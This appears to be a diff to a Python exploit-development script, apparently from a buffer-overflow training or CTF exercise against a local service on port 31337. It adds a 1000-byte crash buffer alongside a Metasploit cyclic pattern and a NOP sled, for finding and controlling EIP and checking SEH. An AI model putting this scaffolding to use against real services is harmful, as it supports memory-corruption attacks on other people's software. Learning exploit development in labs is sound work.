@@ -7,8 +7,9 @@ IP = '127.0.0.1'
 port = 31337
 NOPS = "\x90" * 16
 
-#-----------------1 - BYTE CRASH + GET EIP ADDRESS + CONTROL TEST + CHECK SEH --> EVIL_BUFFER = pattern + eip_control--------------#
+#-----------------1 - BYTE CRASH + GET EIP ADDRESS + CONTROL TEST + CHECK SEH --> EVIL_BUFFER = crash + pattern + eip_control--------------#
 byte_crash = 1000
+crash = "A"*byte_crash
 pattern = str(os.popen("msf-pattern_create -l " + str(byte_crash)).read())
 
 eip_crash = "39654138"  # <-- Write EIP address here
